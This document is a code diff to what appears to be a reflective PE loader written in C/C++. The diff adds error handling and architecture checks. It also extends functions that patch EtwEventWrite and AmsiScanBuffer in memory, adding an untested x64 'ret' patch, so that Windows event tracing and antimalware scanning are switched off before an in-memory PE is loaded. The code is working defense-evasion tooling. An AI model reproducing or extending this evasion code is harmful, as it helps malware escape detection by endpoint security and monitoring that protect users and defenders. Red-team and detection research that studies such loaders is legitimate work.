@@ -185,13 +185,19 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 			// add delta(between preferred base and current base)
 			addressToPatch += deltaImageBase;
 
-			//// set to relocation table permission to allow patching
-			DWORD oldProtect;
-			VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
+			// set to relocation table permission to allow patching
+			DWORD oldProtect, protectRes;
+			protectRes = VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), PAGE_READWRITE, &oldProtect);
+			if (protectRes == 0) {
+				printf("[!] Error modifying memory page protection: %d\n",GetLastError());
+			}
 			// write/patch new absolute address back into relocation entry
 			memcpy((PVOID)((DWORD_PTR)peImageBase+relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
-			//// restore to previous memory protection
-			VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), oldProtect, &oldProtect);
+			// restore to previous memory protection
+			protectRes = VirtualProtect((PVOID)((DWORD_PTR)peImageBase+relocationRVA), sizeof(DWORD_PTR), oldProtect, &oldProtect);
+			if (protectRes == 0) {
+				printf("[!] Error modifying memory page protection: %d\n",GetLastError());
+			}
 
 			// debugging print
 			printf("Relocation Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
@@ -427,7 +433,7 @@ DWORD resolveImportAddressTable(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader, 
 		importDescriptor++;
 	}
 
-	// set previous IAT memory permissions
+	// restore previous IAT memory permissions
 	protectRes = VirtualProtect(importDescriptor, importsDirectory.Size, oldProtect, &oldProtect);
 	if (protectRes == 0) {
 		printf("[!] Error modifying memory page protection: %d\n",GetLastError());
@@ -840,8 +846,9 @@ DWORD patchETW(bool is32Bit = true) {
 		patchBytes = (void*)"\xc2\x14\x00\x00"; 
 		patchSize = 4;
 	} else { 
-		// need to reverse x64 version of EtwEventWrite to get proper return instructions
-		return 1; 
+		// !need to reverse x64 version of EtwEventWrite to get proper return instructions!
+		patchBytes = (void*)"\xc3"; // untested
+		patchSize = 1;
 	}
 
 	// !this check is pointless since ntdll is loaded in ever process!
@@ -860,6 +867,9 @@ DWORD patchETW(bool is32Bit = true) {
 	memcpy(eventWrite, patchBytes, patchSize);
 	// Return memory to original protection
 	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
+
+	// debugging print
+	printf("Patched EWT in host at %08x\n", eventWrite);
 
 	return 0;
 }
@@ -887,13 +897,16 @@ DWORD patchAMSI(bool is32Bit = true) {
     }
 
 	// Get the EventWrite function
-	void* eventWrite = GetProcAddress(amsi, "AmsiScanBuffer");
+	void* sBuffAddr = GetProcAddress(amsi, "AmsiScanBuffer");
 	// Allow writing to page
-	VirtualProtect(eventWrite, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
+	VirtualProtect(sBuffAddr, patchSize, PAGE_EXECUTE_READWRITE, &oldProt);
 	// Patch function
-	memcpy(eventWrite, patchBytes, patchSize);
+	memcpy(sBuffAddr, patchBytes, patchSize);
 	// Return memory to original protection
-	VirtualProtect(eventWrite, patchSize, oldProt, &oldProt);
+	VirtualProtect(sBuffAddr, patchSize, oldProt, &oldProt);
+
+	// debugging print
+	printf("Patched AMSI in host at %08x\n", sBuffAddr);
 
 	return 0;
 }
@@ -905,9 +918,28 @@ DWORD reflectiveLoadPE(char* peBuffer, int len, int argc, char** argv) {
 		return 1;
 	}
 
+	// check if PE image is correct architecture
+	#ifdef _M_IX86
+		if (ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+			printf("[!] PE file is not the correct architecture, need 32bit");
+			return 1;
+		}
+	#else
+		if (ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+		{
+			printf("[!] PE file is not the correct architecture, need 64bit");
+			return 1;
+		}
+	#endif
+
 	// patch Event Tracing for Windows and Antimalware Scan Interface
-	patchETW();
-	patchAMSI();
+	#ifdef _M_IX86
+		patchETW(true);
+		patchAMSI(true);
+	#else
+		patchETW(false);
+		patchAMSI(false);
+	#endif
 
 	// check if PE is .NET
 	if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size > 0) {
